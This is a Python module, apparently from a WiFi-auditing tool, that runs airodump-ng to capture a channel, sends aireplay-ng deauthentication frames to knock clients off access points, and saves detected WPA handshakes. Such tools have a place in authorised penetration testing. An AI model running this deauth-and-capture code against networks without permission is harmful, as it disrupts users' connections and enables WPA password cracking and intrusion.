from __future__ import annotations

import re
import select
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

from .handshake import AircrackDetector, HandshakeDetector, HandshakeResult
from .targets import Target, TargetState


class AbortRequested(Exception):
    pass


_detector: HandshakeDetector = AircrackDetector()


def safe_name(ssid: str, bssid: str) -> str:
    ssid_part = re.sub(r"[^A-Za-z0-9_-]", "_", ssid)
    bssid_part = bssid.replace(":", "-")
    return f"{ssid_part}_{bssid_part}"


def _quit_pressed() -> bool:
    if not sys.stdin.isatty():
        return False
    ready, _, _ = select.select([sys.stdin], [], [], 0)
    if not ready:
        return False
    line = sys.stdin.readline().strip().lower()
    return line == "q"


def capture_channel(
    monitor_interface: str,
    channel: int,
    targets: list[Target],
    tmp_dir: Path,
    timeout: int,
    poll_interval: int = 5,
    on_tick=None,
    deauth: bool = False,
) -> Path:
    tmp_dir.mkdir(parents=True, exist_ok=True)
    prefix = tmp_dir / f"channel-{channel}"

    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--channel",
            str(channel),
            "--write",
            str(prefix),
            "--output-format",
            "pcap,csv",
            monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    cap_path = prefix.with_name(prefix.name + "-01.cap")
    csv_path = prefix.with_name(prefix.name + "-01.csv")
    elapsed = 0
    pending = {t.ap.bssid: t for t in targets}
    dead_check_deadline = min(15, timeout)
    dead_checked = False
    found_count = 0
    try:
        while elapsed < timeout and pending:
            time.sleep(poll_interval)
            elapsed += poll_interval

            if _quit_pressed():
                raise AbortRequested()

            if not dead_checked and elapsed >= dead_check_deadline:
                dead_checked = True
                for bssid, t in list(pending.items()):
                    if not _ap_seen(csv_path, bssid):
                        t.transition(TargetState.NO_HANDSHAKE)
                        del pending[bssid]

            if deauth and pending:
                for bssid in pending:
                    send_deauth(monitor_interface, bssid)

            if cap_path.exists():
                for bssid, t in list(pending.items()):
                    result = _detector.detect(cap_path, bssid)
                    if result.count > t.handshake_count:
                        t.handshake_count = result.count
                        t.transition(TargetState.HANDSHAKE_FOUND)
                    if t.done:
                        found_count += 1
                        del pending[bssid]

            if on_tick:
                on_tick(channel, elapsed, timeout, found_count, len(targets))
    finally:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

    for t in pending.values():
        t.transition(TargetState.NO_HANDSHAKE)

    return cap_path


def send_deauth(monitor_interface: str, bssid: str, count: int = 5) -> None:
    subprocess.run(
        ["aireplay-ng", "--deauth", str(count), "-a", bssid, monitor_interface],
        capture_output=True,
        text=True,
        timeout=15,
    )


def _ap_seen(csv_path: Path, bssid: str) -> bool:
    if not csv_path.exists():
        return False
    text = csv_path.read_text(encoding="utf-8-sig", errors="replace")
    return bssid.upper() in text.upper()


def has_handshake(cap_path: Path, bssid: str) -> bool:
    return _detector.detect(cap_path, bssid).detected


def validate(cap_path: Path, target: Target, backend=None) -> bool:
    detect = backend.detect_handshake if backend is not None else _detector.detect
    result = detect(cap_path, target.ap.bssid)
    if result.detected:
        print(
            f"\n[HANDSHAKE FOUND]\n\nSSID:       {target.ap.ssid}\n"
            f"BSSID:      {target.ap.bssid}\nChannel:    {target.ap.channel}\n"
            f"EAPOL:      detected\nValidation: PASS\n\nSaving capture..."
        )
    return result.detected


def save_result_copy(cap_path: Path, captures_dir: Path, target: Target) -> Path:
    captures_dir.mkdir(parents=True, exist_ok=True)
    dest = captures_dir / f"{safe_name(target.ap.ssid, target.ap.bssid)}.cap"
    shutil.copy2(cap_path, dest)
    return dest


def discard(cap_path: Path) -> None:
    if cap_path.exists():
        cap_path.unlink()
